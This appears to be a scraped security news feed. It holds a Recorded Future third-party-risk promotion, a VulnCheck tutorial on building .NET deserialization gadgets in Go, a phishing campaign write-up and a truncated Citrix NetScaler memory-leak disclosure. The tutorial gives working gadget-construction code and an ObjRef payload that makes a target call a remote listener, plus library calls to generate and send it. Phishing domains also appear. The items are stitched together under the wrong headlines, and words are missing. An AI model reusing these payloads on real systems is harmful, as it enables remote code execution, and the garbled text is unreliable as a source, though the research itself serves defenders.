jurisdictions, and data environments. When breaches involve personally identifiable information (PII), PHI, or payment card data, costs can climb even higher as regulatory penalties and legal exposure multiply.Hidden Dangers: Fourth-Party and Nth-Party RiskModern supply chains extend far beyond the vendors an organization directly manages. Each third-party relationship is underpinned by its own network of fourth and nth parties—subcontractors, technology providers, and cloud services. These indirect dependencies create exposure that most organizations can neither see nor control.According to Whistic’s 2024 Third-Party Risk Management Impact Report, half of all companies work with more than 100 vendors, up from 38% in 2023. And for each third-party vendor in a supply chain, organizations typically have indirect relationships with nearly 14 times more fourth and fifth parties, according to The Cyentia Institute.These numbers underscore the growth of interconnected risk. Each new supplier introduces dozens of unseen connections, and every one of those connections can become an attacker’s entry point. The impact can quickly cascade through shared platforms, APIs, and service providers, affecting multiple tiers of partners and customers.The MOVEit breach of 2023 is a prime example. What began as a single vulnerability in one file transfer application rapidly spread across thousands of organizations, from banks and universities to government agencies. Many of those affected never had a direct contract with the compromised vendor.Why Traditional Third-Party Risk Assessments Are FailingFor many organizations, third-party risk management still relies on the same tools and tactics used a decade ago—static checklists, self-reported questionnaires, and periodic audits. These methods were designed for a slower, more predictable vendor landscape. Today, they’re simply outmatched by the size and interconnectivity of modern supply chains.Vendor questionnaires and checklists are only as good as the answers provided. Too often, the information is outdated, incomplete, or inaccurate, leaving security teams with a false sense of assurance. These assessments might capture what a vendor’s security looked like at a single moment in time, but attackers don’t wait for your next scheduled check-in. Every day between audits is another opportunity for adversaries to exploit newly discovered vulnerabilities or misconfigurations.Static assessment programs also lack the scale and speed required to monitor hundreds or thousands of vendors effectively. As the vendor ecosystem expands, traditional approaches simply can’t keep pace with the dynamic nature of today’s threat environment.The data underscores just how strained these legacy methods have become:44% of organizations assess more than 100 third parties each year, yet only 4% of organizations have high confidence that their third-party questionnaires accurately reflect real-world risk.Nearly four in ten companies use multiple questionnaires for different risk domains, sending an average of 55 questionnaires to third parties annually.These numbers reveal a troubling paradox: organizations are spending more time than ever assessing vendors but gaining less clarity than ever in return. Without continuous, intelligence-led visibility, even the most diligent third-party risk programs are operating one step behind and measuring compliance rather than managing risk.Shifting from Assessment to Intelligence: A Better ApproachTraditional third-party risk assessments expose the limits of hindsight. Intelligence-led monitoring delivers the advantage of foresight.Static questionnaires stop at the vendor’s last self-reported status, which quickly becomes obsolete when adversaries move by the hour. An intelligence-based approach, by contrast, looks outward to live signals, behavioral patterns, and threat activity that reflect a vendor’s true security posture in real time.The core shift is from  to . capture what vendors say about their defenses. reveals what attackers see (and often what vendors don’t yet know).This change is more than a process upgrade; it’s an evolution in how organizations manage supply chain security. Continuous, intelligence-led monitoring replaces static snapshots with ongoing, data-driven visibility across every tier of the vendor ecosystem.By ingesting indicators from the open web, dark web, and technical telemetry, organizations can identify vulnerabilities or emerging exploit chatter as they happen—not months after the fact. The advantages are clear: Intelligence shifts third-party risk from response to prevention, allowing teams to identify issues before they evolve into breaches.Objective vs. Subjective: Real-world data replaces self-attestation, grounding risk decisions in observable evidence rather than vendor claims.Comprehensive Visibility:Continuous monitoring provides an attacker’s-eye view of each vendor’s digital footprint, uncovering blind spots that traditional audits miss.How Recorded Future’s Third-Party Intelligence Delivers Continuous, Contextual InsightRecorded Future’s Third-Party Intelligence exemplifies this modern approach. It delivers real-time risk scores and actionable alerts derived from the broadest range of data sources available, including dark web monitoring, technical telemetry, and validated threat intelligence. These insights integrate into existing risk management workflows, transforming static oversight into a living, adaptive defense.Core capabilities include: Tracks over 5 million organizations and 1 million technology products for breaches, malicious traffic, ransomware extortion, and dark web chatter. Uses machine learning and NLP to analyze data from hundreds of thousands of open, dark web, and technical sources, generating dynamic Risk Scores that quantify vendor exposure.Dark Web and Threat Intelligence. Identifies data leaks, compromised credentials, and chatter around vendor breaches before disclosure.Comparative Vendor Assessment. Enables side-by-side comparison of vendors to prioritize procurement and onboarding decisions. Delivers comprehensive, context-rich risk profiles for leadership and board reporting. Connects with existing TPRM, GRC, and ticketing platforms, feeding risk data into established workflows.Automated Mapping of Internal Entities and Subsidiaries. Assesses risk stemming from a supplier’s technical infrastructure, subsidiary relationships, and geographic footprint. Allows teams to define criteria for alerts (e.g., vendor breach, new exposure) and focus only on the most relevant risks.Customer outcomes include:73% average increase in visibility into potential threats32% less time spent on evaluating new vendors or supplier35% more third parties assessed43% average increase in security team capacityOur time to detect third-party cyber breaches has decreased substantially. Previously, we were either notified directly by a third party or via a news outlet or regulatory reporting, which meant that it could take days or even weeks for us to be made aware. With Recorded Future, we've been able to identify third-party concerns within one to two days.Cybersecurity Incident Management, Insurance CompanyThe evidence is clear: reactive oversight leaves organizations blind to threats already moving through their supply chains. A continuous, intelligence-driven approach changes that equation. By combining real-time visibility with actionable insights, security and risk teams can detect vendor threats early, respond faster, and reduce the financial and reputational fallout of supply chain attacks.Don’t wait for the next third-party breach to become another statistic. Book a demo to see how Recorded Future’s Third-Party Intelligence helps organizations stay ahead of rapidly evolving risks.What is considered a third-party risk?A third-party risk is any potential threat to your organization's security, finances, or reputation posed by an external vendor, supplier, partner, or contractor who has access to your data, systems, or networks. This includes risks like data breaches, operational disruptions, and compliance violations originating from your supply chain.What are the main types of third-party risk?The main types include cybersecurity risk (data breaches, malware), operational risk (service disruptions), compliance risk (violating regulations like GDPR or CCPA), reputational risk (damage to your brand by association), and financial risk (revenue loss, regulatory fines).How often should third-party risk assessments be conducted?While traditional best practice was to conduct assessments annually, the current threat landscape demands a shift to continuous monitoring. Relying on annual, point-in-time assessments leaves significant security gaps where a vendor's risk posture can change without you knowing.How does Recorded Future help with third-party risk assessment?Recorded Future’s Third-Party Intelligence solution transforms risk assessment from a static, manual process into a dynamic, data-driven one. It provides continuous, real-time intelligence on your vendors' external security posture by monitoring millions of sources, including the dark web. This allows you to proactively identify threats, prioritize risks with objective scoring, and take action before a vulnerability impacts your organization.What is the first step to improving a third-party risk management program?The first step is to gain complete visibility into your entire vendor ecosystem. You cannot protect what you don't know you have. This involves identifying every third party and fourth party with access to your data or systems and then beginning the process of prioritizing them based on their level of access and criticality to your operations.]]></content:encoded></item><item><title>Eurofiber - eurofiber.com</title><link>https://haveibeenpwned.com/PwnedWebsites#Eurofiber</link><author></author><category>databreach</category><pubDate>Thu, 13 Nov 2025 00:00:00 +0000</pubDate><source url="https://cybermonit.com/leaks">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>OperationEndgame3 -</title><link>https://haveibeenpwned.com/PwnedWebsites#OperationEndgame3</link><author></author><category>databreach</category><pubDate>Thu, 13 Nov 2025 00:00:00 +0000</pubDate><source url="https://cybermonit.com/leaks">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Breaking mPDF with regex and logic</title><link>https://medium.com/@brun0ne/breaking-mpdf-with-regex-and-logic-bf915300483f</link><author>/u/ZoltyLis</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 23:24:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Making .NET Serialization Gadgets by Hand</title><link>https://www.vulncheck.com/blog/making-dotnet-gadgets</link><author>/u/chicksdigthelongrun</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 21:57:13 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Recently our Initial Access Intelligence team added a .NET deserialization payload generation library to go-exploit, VulnCheck's open-source exploit framework. This article discusses how that library came to be while providing enough information into that process to allow others to create their own gadget chains by hand if they so please. At the end, we discuss how to use the new go-exploit library to generate deserialization payloads (without the need for Windows), or for integration in your own Golang-based exploits, regardless of whether or not they use go-exploit. Our library is designed to be used "out of the box" by any Go program without needing to define or set up any special objects. You can learn more about the advantages of go-exploit here.Challenges of adding deserialization payloads into exploitsHow to create your own deserialization library, including a technical breakdown of .NET serialization streamsHow to use VulnCheck's own .NET deserialization library for golang-based exploitsWhen you are writing .NET deserialization exploits in a language other than C# and you want dynamic parameters in your payload, your options are generally limited to "shelling out" to ysoserial.net or pasting in a binary array that was  by ysoserial.net and then editing it at runtime.Neither of these options is great. The first option demands that you use a specific program on a specific operating system (Windows) to create the gadgets. The second option is prone to mistakes due to the length encoding of strings and certain records being incorrectly implemented; it also makes the payload less modifiable/clean.We instead opt for a third option: to create the .NET gadgets "by hand" for our golang-based exploit framework, go-exploit.
In doing so, we learned a great deal about the .NET serialization stream structure and will present it in this article to help those wishing to do something similar in their own framework or anyone just wanting to learn more about serialization streams.Though this article is written in the context of golang, the same ideas should be transferable to any other language.I am going to show how .NET deserialization objects are broken down by looking at what their sub-components are and how they are constructed during serialization. After that I will show you how to create your own serialization library that would allow you to recreate these gadgets in any language. Finally, I will show how to use gadgets directly from the new go-exploit library..NET deserialization payloads are effectively a stream of "Records" which can be thought of as structs. Given that records are effectively structs, it makes sense that to create gadgets, we should make structs and then place them in a byte array such that we produce a sane gadget at the end.Throughout this tutorial we will be using an ObjRef gadget, viewable using this cyberchef link. I chose this gadget because it is small and simple; other gadgets are generally much larger.The very first record we will look at in the stream is a static record that begins every serialized .NET stream, the SerializationHeaderRecord.Here is the hex dump for the SerializationHeaderRecord:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|

According to the documentation above: "The SerializationHeaderRecord record MUST be the first record in a binary serialization. This record has the major and minor version of the format and the IDs of the top object and the headers."Almost every link in this article will be to Microsoft documentation and while I am certain that you know how to read given that you've made it this far, I have dropped a few tips below to ease interpretation of these pages for those who are unfamiliar with the format.There is a table representing the layout of the record; I find this table more confusing than helpful so you may want to consider ignoring it (see image below for clarification).The information  the table that breaks down each member of the struct is typically much more useful and easier to read.The member information in the documentation is in the same order that the members appear within the records.You can assume all INT32 values are little-endian.It is important to read all member descriptions.Now that we know how to decipher the Microsoft docs, let's get on to the first member in the record, RecordTypeEnum.The description for this member reads: "RecordTypeEnum (1 byte): A RecordTypeEnumeration value that identifies the record type. The value MUST be 0."When reversing serialized streams on your own for reconstruction, this byte is the first byte you will see for a given record and it tells you what record is coming next. In this case, we saw a , so we know a SerializationHeaderRecord is coming.Every record type has its own  that is 1 byte, and each record has a different number that is sequential based on their order in the RecordTypeEnumeration. That link contains a list of all the record types, of which only a subset have been useful for payloads, having written about a dozen or so gadgets by hand. With that said, I would  suggest going ahead and implementing every gadget, but rather build them as needed.So for a SerializationHeaderRecord, this value will ALWAYS be  in hexidecimal, so we should represent this as a constant somewhere in our code. In the Microsoft docs you see that RecordTypeEnumeration is exactly that, an enum, so we should just make an enum for record types in our code. I am using Golang, which does not have have enums natively, and while there are methods for creating them in go, I will just use a string map because that will serve my purposes just fine here. Using the Microsoft docs as reference, it looks something like this:var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    "ClassWithId":                    1,
    "SystemClassWithMembers":         2,
    "ClassWithMembers":               3,
    "SystemClassWithMembersAndTypes": 4,
    "ClassWithMembersAndTypes":       5,
    "BinaryObjectString":             6,
    "BinaryArray":                    7,
    "MemberPrimitiveTyped":           8,
    "MemberReference":                9,
    "ObjectNull":                     10,
    "MessageEnd":                     11,
    "BinaryLibrary":                  12,
    "ObjectNullMultiple256":          13,
    "ObjectNullMultiple":             14,
    "ArraySinglePrimitive":           15,
    "ArraySingleObject":              16,
    "ArraySingleString":              17,
    "MethodCall":                     21,
    "MethodReturn":                   22,
}
The next member is RootId (4 bytes), which is described as "An INT32 value (as specified in  section 2.2.22) that identifies the root of the graph of nodes."This is a variable value, so let's add it to the struct as an int. Remember that we did not add RecordTypeEnum because this is a constant/static value.// The start of our SerializationHeaderRecord struct
type SerializationHeaderRecord struct {
    RootID int
}
Remembering that all INT32 values are little-endian, and knowing that this is a  from the hex dump, we know we need to have this member output . That said, we can start making some methods for our struct to produce the binary output for this record:// NOTE: SerializationHeaderRecord struct is still incomplete
var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}
type SerializationHeaderRecord struct {
    RootID int
}
func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"]))
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    return recordTypeEnumString + rootIDString, true
}
shr := SerializationHeaderRecord{ RootID: 1 }
shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00" at this time
This is the basic idea and structure of how to create these records and ultimately turn them into binary streams. Enough records converted into binary streams in the right order, you have a finished serialization stream!Continuing on, the next member is the HeaderId, which much like the previous member, is described as a variable INT32 value. We will add this to the struct as an int:type SerializationHeaderRecord struct {
    RootID   int
    HeaderID int
}
The MajorVersion and MinorVersion are a little different from the last two members as they MUST be 1 and 0 respectively.
We do not need to add them to the struct, but instead just update the  method for this struct to finish off our implementation of this record.type Record interface {
    ToRecordBin() (string, bool)
}

var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}

type SerializationHeaderRecord struct {
    RootID int
    HeaderID int
}

func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"])) // 0
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    headerIDString := transform.PackLittleInt32(serializationHeaderRecord.HeaderID)
    majorVersion := transform.PackLittleInt32(1) // MUST be 1
    minorVersion := transform.PackLittleInt32(0) // MUST be 0
    return recordTypeEnumString + rootIDString + headerIDString + majorVersion + minorVersion, true
}

shr := SerializationHeaderRecord{ RootID: 1 , HeaderID: -1 }

shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"

// add it to the full gadget being built
var gadgetRecords []Record
gadgetRecords = append(gadgetRecords, shr) // adding serialization header record to the gadget

Remember, if you need a fully working library to reference or use as is, see go-exploit's dotnet deserialization package.Now things get a bit more interesting with the very next record in the stream, SystemClassWithMembersAndTypes.Here is the hex dump for SystemClassWithMembersAndTypes:00000010  __ 04 01 00 00 00 10 53 79 73 74 65 6d 2e 45 78  |......System.Ex|

The SystemClassWithMembersAndTypes record starts at offset 0x11. This is sort of the "main" record that you will see in .NET gadgets, or its alternative, ClassWithMembersAndTypes. By main record I mean, this is the record that actually defines the object/class that is intended to be deserialized which is sort of the "point" of a serialization stream. The difference between the two types above (SystemClassWithMembersAndTypes and ClassWithMembersAndTypes) is that the SystemClassWithMembersAndTypes is missing a LibraryID, as it is implicitly understood to be a system class and does not need it explicitly defined. Otherwise, these two records are the same.These class records are quite verbose as they are primarily composed of two other (non-record) data structures: a ClassInfo and a MemberTypeInfo. Viewing the documentation, we again see a RecordTypeEnum indicating that this is a SystemClassWithMembersAndTypes record which in this case, must be a 4. If you look, this is already present in our RecordTypeEnumMap above.Moving onto the ClassInfo member, we can model it as a struct like so:type ClassInfo struct {
    ObjectID int          // A value represented as an INT32
    Name string           // Length prefixed string
    MemberCount int       // should be equal to len(MemberNames) // this could also just be created dynamically during to ToRecordBin() method
    MemberNames []string  // MemberNames
}
The first member of this struct is an Object ID. These are not specific to ClassInfo structures but are actually a part of many other records and structures that compose .NET serialization streams. These are basically used as unique identifiers or even "addresses" to reference objects throughout a serialization stream. These generally increment by 1 with each new object added to a stream.The value for this one, as show in the dump output above, should be a 1. Represented as a little-endian INT32 ().Next is the Name. This is the name of the actual class, though it is not a normal string but is instead a LengthPrefixedString. Do not assume this is "just an int of the length" — it is encoded in a specific way as defined in the documentation. Though for shorter length strings this  usually come out to simply be something like hex(len(string)).To make things easier, I will leave the appropriate function for encoding this length below, from our go-exploit dotnet package.func Write7BitEncodedInt(value int) []byte {
    var (
        bs []byte
        v  = uint(value)
    )
    for v >= 0x80 {
        bs = append(bs, byte(v|0x80))
        v >>= 7
    }
    bs = append(bs, byte(v))
    return bs
}
The Name for this one is "System.Exception", which makes sense, given that this is a system class and we are dealing with a SystemClassWithMembersAndTypes. But do not forget to prefix it with the encoded length (16, which in this case comes out to ), making it: .Next is MemberCount, another INT32 value. As the name suggests, this is the number of members that are defined in the next item in the struct, the MemberNames. As the dump shows, this is a 1, which we know will be represented as .Last in ClassInfo, is the array of MemberNames, which is a sequence of LengthPrefixedStrings. These define the member names for the class. Remember we should only expect to read N members from this where N == MemberCount. In this case, the only member name present should be "ClassName" with its length prefix in hex: .So that does it for ClassInfo, but remember that was just one component of the SystemClassWithMembersAndTypes; the next is the MemberTypeInfo, a data structure that exists to provide information ABOUT the members of the class.Do not be fooled by how few members are shown in the documentation. This component is probably the source of the most confusion when building these serialization objects by hand, primarily due to "AdditionalInfos".First is BinaryTypeEnums. Per the docs, this is a sequence of single bytes that denote the data TYPE for each member of the class. The attribution of a given type to its corresponding member is derived from the POSITION of the individiual BinaryTypeEnum in the sequence relative to the sequence of class members. All possible BinaryTypeEnum values are located here.That was probably a bit unclear, so for example, if you have three members in a class, let's say they are someStringOne (String), someStringTwo (String), and someIntThree (Int).// note: this is pseudocode
class SomeClass {
    someStringOne string
    someStringTwo string
    someIntThree  int
}
The MemberTypeInfo.BinaryTypeEnums section for that class should simply be: "\x01\x01\x00".This is because according to the BinaryTypeEnum values documentation, "\x01" denotes a string of which there are two here. The int value, however, is not represented as its own enum value — this is where it gets a tad bit more confusing.According to these docs, an int value is a primitive type and is therefore defined as a PrimitiveTypeEnum value. So we mark its BinaryTypeEnum value as a "\x00" (Primitive) so that when the stream is read it knows to look at the next section (AdditionalInfos) to determine the  type of this member.So to recap, our hypothetical "\x01\x01\x00" is described as a string (0x01), another string (0x01), and a primitive type (0x00) which we define as an int in the next section, AdditionalInfos.This is a data structure that in some class-based records will not be used at all. It is ONLY present if and when one of the BinaryTypeEnums are either Primitive, SystemClass, Class, or PrimitiveArray. An easy way to remember it is to see if any of the BinaryTypeEnums have primitive or class in their names. If the binary type for a given member is anything OTHER than those four, an AdditionalInfos entry is NOT needed for that member. If NONE of the members' BinaryTypeEnums values are primitive or class based, then you can omit the AdditionalInfos component entirely.Depending on if it is a Primitive, SystemClass, Class, or PrimitiveArray, a different type of value is expected in the AdditionalInfo data structure. Keep in mind also that the values within the AdditionalInfos data are position-correspondent, just like BinaryTypeEnum itself. This means that a given value within the AdditionalInfos section corresponds with the position of the BinaryTypeEnum requiring an AdditionalInfos value to be added.To clarify further... if you had someStringOne, someIntTwo, someStringThree, and someIntFour, they would have a BinaryTypeEnum section of . Of those four BinaryTypeEnums, only TWO of them require an AdditionalInfos entry, so the entire AdditionalInfos section for those members would be  (0x08 denotes INT32). The first  would correspond to someIntTwo, and the second  would correspond to someIntFour; the strings are ignored because they are not a Primitive, PrimitiveArray, SystemClass, or Class BinaryTypeEnum and thus do not need AdditionalInfos for them.I hope that made sense, because now we will look at the AdditionalInfos section for the SystemClassWithMembersAndTypes from our ObjRef example which uses a slightly more complicated BinaryType to define which is the SystemClass as denoted by the  in the BinaryTypeEnums section. To aid the reader, this BinaryTypeEnum is located at offset 0x35 of the CyberChef dump.If we look at the MemberTypeInfo documentation again, specifically at the AdditionalInfos section, we see the following sentence: "For the BinaryTypeEnum value of SystemClass, this field specifies the name of the class (2)". So that means slap a string in there, and of course it must be a LengthPrefixedString not just a string by itself.So just to summarize, the BinaryTypeEnums section for this SystemClassWithMembersAndTypes's MemberTypeInfo section is . Immediately following that, we start the AdditionalInfos if needed. Because the BinaryTypeEnums section contains a SystemClass BinaryTypeEnum, we DO need to provide an AdditionalInfos section, which in this case must be the name for the system class. Therefore, the AdditionalInfos section for this SystemClassWithMembersAndTypes's MemberTypeInfo section would be the prefix , followed immediately by "System.Runtime.Remoting.ObjRef". If there  more Primitive or Class-based BinaryTypeEnum defined in the BinaryTypeEnums section of this MemberTypeInfo, then AdditionalInfos entries would immediately follow this LengthPrefixedString.Great, so we have exhausted all of the members for SystemClassWithMembersAndTypes which ends at offset 0x54. So what is all the stuff after it in the CyberChef hexdump output?Well, we know that the SystemClassWithMembersAndTypes has ended because we made all of the sections per the defined specification. When a record ends in a serialization stream, the next byte is generally a new record; therefore the RecordTypeEnumeration documentation must be consulted. But something else that has not been revealed thus far and is not described well in the relevant Microsoft documentation: when a MemberTypeInfo ends, what generally follows immediately after is the VALUE for those defined members, one after another in a sequence.Knowing that, we can assume that the next record is the VALUE for the members we just defined. According to the RecordTypeEnumeration documentation, the next byte, a  (offset 0x55), is a MemberReference record. If you remember above where I talked about ObjectIDs, this is where the primary record references those.If you look at the documentation for the MemberReference.IdRef section, it says that the ObjectID can be for an object that comes after OR before the referencing record. If we said the ObjectID is like a memory address of an object, you can think of the MemberReference as a pointer to these objects — this way, if that object is referenced multiple times, you do not need to redefine the entire object record but can instead just provide a MemberReference record to an already defined object, which is only 5 bytes rather than the size of an entirely new object.type MemberReferenceRecord struct {
    RecordTypeEnum int // 1 BYTE, ALWAYS a 0x09
    IDRef int          // 4 BYTES - INT32 value containing the ObjectID that is being referenced
}
Given that the only previous object we defined (the "System.Exception" SystemClassWithMembersAndTypes) has an ObjectID of 1, we can assume the referenced object will come AFTER this record in the serialization stream. This assumption stands true, as the very next record  have an objectID of  and it should be familiar since it is another SystemClassWithMembersAndTypes. To clarify, the VALUE for the only member in the previously defined SystemClassWithMembersAndTypes ultimately points to  SystemClassWithMembersAndTypes.Again, here is the full dump for easier reference:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|

Our new record begins at hex 0x5A.I will not rehash everything since we have already defined a very similar record, but I  define the values in case there is confusion. You could also stop here and try and make it yourself if that sounds like fun to you.SystemClassWithMembersAndTypes.RecordTypeEnum = 4 SystemClassWithMembersAndTypes.ClassInfo.ObjectID = 2 , This should look familiar from the immediately preceding MemberReference record.SystemClassWithMembersAndTypes.ClassInfo.Name = lenPrefix  + "System.Runtime.Remoting.ObjRef", Should also familiar from the AdditionalInfos section of Object 1.SystemClassWithMembersAndTypes.ClassInfo.MemberCount = 1 SystemClassWithMembersAndTypes.ClassInfo.MemberNames = lenPrefix  followed by the string: SystemClassWithMembersAndTypes.MemberTypeInfo.BinaryTypeEnums = . States that the only member for this class if of type: string.SystemClassWithMembersAndTypes.MemberTypeInfo.AdditionalInfo = "", nothing for this as we do not need it; none of the BinaryTypeEnums are Classes or Primitives based, all we have is a string.Those are all of the values for all of the components of  object, but as we know, we defined one member; therefore, we must provide one member value immediately following the SystemClassWithMembersAndTypes, and because this a serialization stream, we cannot simply have random values floating around in the stream. All things must be defined in a RECORD since once again, a serialization stream is a sequence of records.With all of that said, the member type that we defined is of BinaryTypeEnum , which is a string. So how do we represent a string as a record? Using the next record in the dump, a BinaryObjectString, defined below.type BinaryObjectString struct {
    RecordTypeEnum int // 1 BYTE - ALWAYS 0x06
    ObjectID int       // 4 BYTES - INT32. This is a record, therefore it needs an ObjectID in case it needs to be referenced
    Value string       // This needs to be a LengthPrefixedString. This contains the value for the string.
}
So immediately following that SystemClassWithMembersAndTypes (Object 2), we define the next object in the stream as such:BinaryObjectString.RecordTypeEnum = 0x06BinaryObjectString.ObjectID = BinaryObjectString.Value = lenPrefix  followed by  "http://192.168.51.15:8888/hcQaAT"Then we end the entire serialization stream using the MessageEnd Record. This is the simplest record of all, it is just a  that denotes the end of the stream.With all of the structs defined, and the process for understading them under wraps, all that is left is to define a method similar to the  shown in the earlier example for each of the discussed records and then concatenate those results in the same order as the dump. This is left as an exercise for the reader.You could also use our go-exploit library as a reference or for gadget generation. Also, do note that this was a rather small serialization stream example; there are much more complicated gadgets, some of which contain serialization streams as values inside of other serialization stream records. Even so, construction of those should all follow the same basic principles explained in this article.Using VulnCheck's go-exploit library to generate the ObjRef payload is as simple as:package main
import (
    "github.com/vulncheck-oss/go-exploit/dotnet"
)
func main() {
    payload := dotnet.CreateObjectRef("something", dotnet.BinaryFormatter) // gadget generated!
    sendPayload(payload)
}

The goal is to lure you to a phishing site that steals login credentials—credentials that could unlock your email, cloud storage or other personal accounts.The email claims that, due to an upgrade in the Secure Message system, some pending messages didn’t make it to your inbox and are ready to be moved there now.“Email Delivery Reports: Incoming Pending MessagesWe have recently upgraded our Secure Message system, and there are pending messages that have not been delivered to your Inbox.Failure Delivery MessagesEmail Delivery Reports For  info@seychellesapartment.com   Status :                         Subject:                      Date:            Time:{A couple of message titles that are very generic and common as not to raise any suspicion}Note     : The messages will be delivered within 1-2 hours after you receive a confirmation Mail Notice.

(link)”Both the “Move to Inbox” button and the unsubscribe link abuse a cbssports[.]com redirect to reach the real phishing site located on the domain mdbgo[.]io, which was blocked by Malwarebytes.Researchers at Unit42 warned about this type of phishing campaign, so we decided to take a closer look. The links pass the spoofed email address as a base64-encoded string to the phishing site. Going to that site, we were served this fake login screen with the target’s domain already filled in—making it look personalized and legitimate:Contrary to Unit42’s findings, we found that this version of the attack is more sophisticated and likely evolving quickly. The phishing site’s code is heavily obfuscated, and credentials are harvested through a websocket.A websocket keeps an open channel between your browser and the website’s server—like a phone call that never hangs up. This lets the browser and server send messages instantly back and forth, in both directions, without needing to reload the page. Cybercriminals love using websockets because they receive your details the instant you type them into a phishing site, and can even send prompts for additional information, such as two-factor authentication (2FA) codes.This means that if you enter your email and password on such a site, attackers could instantly take control of your email, access cloud-stored files, reset other passwords, and impersonate you across services.How to stay safe from phishing emailsIn phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsAlways check the website address in the browser before signing in. Make sure it matches the site you expect to be on.Other important tips to stay safe from phishing in general:Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive, but it can help you spot some attempts. through another channel if you receive an attachment or a link you weren’t expecting.Keep your device and all its software updated.Use multi-factor authentication (MFA) for every account you can.Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately.several subdomains of mdbgo[.]ioxxx-three-theta.vercel[.]appveluntra-technology-productivity-boost-cold-pine-8f29.ellenplum9.workers[.]devWe don’t just report on threats—we remove them]]></content:encoded></item><item><title>Google Sues China-Based Hackers Behind $1 Billion Lighthouse Phishing Platform</title><link>https://thehackernews.com/2025/11/google-sues-china-based-hackers-behind.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8QizRTvnh2FKfShLUyRGB3nG7j8gwkx9JSvsjDH6VcXmTi9PjdDOHeM-xRjC7uhftMQ097vBryvyFeF0z8tPOWqVEa9qU8vAJxXeppNmdDMAW4ISJScYLrYVS45803vYriSa6qDzZ2mhH0lq00WHCJQhvW7nFIVbYMrTns6Z8rC-yF68QEtar56NWcec1/s1600/google-phishing.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 15:48:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google has filed a civil lawsuit in the U.S. District Court for the Southern District of New York (SDNY) against China-based hackers who are behind a massive Phishing-as-a-Service (PhaaS) platform called Lighthouse that has ensnared over 1 million users across 120 countries.

There’s an elegance to vulnerability research that feels almost poetic - the quiet dance between chaos and control. It’s the art of peeling back the layers of complexity, not to destroy but to understand; to trace the fragile threads that hold systems together and see where they might fray.

There’s beauty in that tension - the simultaneous act of breaking and creating, of exposing weakness to make strength possible. It’s a kind of intellectual intimacy, where curiosity meets consequence, and discovery hums just beneath the surface of what others take for granted.

And sometimes, you casually click your way to a vulnerability with a web browser.

Yes! We are discussing security appliances today!

As we’ve discussed before, it’s not uncommon to stumble into zero-days while exploring a code base or system in the pursuit of reproducing an N-day.

### CitrixBleed2

That’s exactly what happened in August 2025, when we triggered a rapid-response event across our client base for CitrixBleed2 (CVE-2025-5777) - a vulnerability affecting Citrix NetScaler appliances.

CitrixBleed2 was the second edition (which one do you have the fondest memories of?) of CitrixBleed - another painful memory leak vulnerability. These memory leak vulnerabilities allowed for the arbitrary disclosure of memory, pre-authentication - reportedly playing a role in the ransom of numerous organizations, weaponized trivially by identifying SSLVPN session IDs (and similar) contained within leaked memory.

This time, within the spools of our own collateral damage, we’ll be discussing the vulnerabilities we stumbled into:

- WT-2025-0089 - Memory Leak (but, not in the real world - no CVE)
- WT-2025-0090 - Reflected XSS (assigned CVE-2025-12101)

Stop - **before you start screaming, this (the Memory Leak) is not another CitrixBleed.**

But, there is a pattern - and when a vulnerability that discloses memory is triggered by purely misconfiguring a device (as opposed to things your average user couldn’t do with a web browser), you have to wonder what design and architecture choices resulted in this feeling of fragility around reading of memory.

### WT-2025-0089 - The Memory Leak, Explain

While analyzing CitrixBleed2, we were forced to become certified Citrix NetScaler experts - sacrificing what felt like a disproportionate amount of time to configure an appliance.

Within this lost time, we were forced to configure AAA. “What’s AAA”, every unharmed human asks?

> The AAA feature stands for **Authentication, Authorization, and Auditing**— essentially, the part of Citrix that decides _who_ can log in, _what_ they can access, and _what_ they do once inside.

> When a user connects through Citrix Gateway, the AAA system validates their credentials (via username, password, or even SAML), applies access rules, and logs the session for auditing. In short, it’s the **gatekeeper** that controls and monitors all access to Citrix applications and resources.

Visually represented as below:

If you’ve ever configured a Citrix NetScaler device - you likely dream of a career in goat farming. We are so sorry, and we now understand.

As we stumbled through the configuration process, we did something everyone expects - we made a mistake.

At one point, we skipped a step. But, our eyes widened when we realised this omission had resulted in a condition that left the appliance spewing memory.

When in this condition, browsing to / on the affected device would return a helpful error message (UX is important!), and leaked memory:

To reproduce this issue:

1. Create a new AAA virtual server via the web interface
2. Without enabling the feature via CLI, the root page of the web interface will start leaking memory

For context, this is how the feature is normally enabled via the CLI:

### How Do We Feel About This?

Not great? The vulnerability itself, while not ideal is frankly not a real-world concern given the likelihood of this wildly improbable configuration (we found none) existing in any Internet-exposed environment.

Citrix confirmed with us that this was their view as well, and thus decided to not assign a CVE:

